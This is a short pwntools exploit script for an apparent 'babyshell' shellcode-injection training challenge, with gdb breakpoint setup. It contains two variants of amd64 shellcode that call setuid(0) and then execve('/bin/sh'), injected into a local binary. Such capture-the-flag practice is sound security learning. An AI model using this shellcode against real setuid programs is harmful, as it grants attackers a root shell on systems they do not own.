from pwn import *

pwnable = './babyshell_level8_testing1'

elf = ELF(pwnable)

context(terminal=['tmux', 'new-window'])

context.log_level = 'DEBUG'
context(os = 'linux', arch = 'amd64')

debug_set_1 = '''
    b main
    b *0x5555555555af
    b *0x5555555554fa
    #b *0x5555555554c8
    '''
    
    #b *0x5555555555af
    #b *0x5555555554c8

if len(sys.argv) > 2 and sys.argv[1] == 'debug':
    #p = process(pwnable)
    #gdb.attach(p, debug_set_1)
    p = gdb.debug(pwnable, debug_set_1)
else:
    p = process(pwnable)
    #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "/root/libc_32.so.6")}
    p = process(pwnable, debug_set_1)

shellcode_2 = '''

push 0
pop rdi
push 105
pop rax


syscall 
mov rax, 59     
lea rdi, [rip+binsh]    


mov rsi, 0      
mov rdx, 0  
syscall         
binsh:
.string "/bin/sh"
'''

shellcode_3 = '''
push 0
pop rdi
push 105
pop rax
syscall


mov rax, 59
lea rdi, [rip+binsh]
pop rsi

mov rsi, 0
mov rdx, 0
syscall
stc
stc

binsh:
.string "/bin/sh"
'''

shellcode = asm(shellcode_3)

p.recvuntil("0x1337000.\n")
p.send(shellcode)
#p.send(shellcode)
#p.recvuntil("Segmentation fault")
p.wait_for_close()
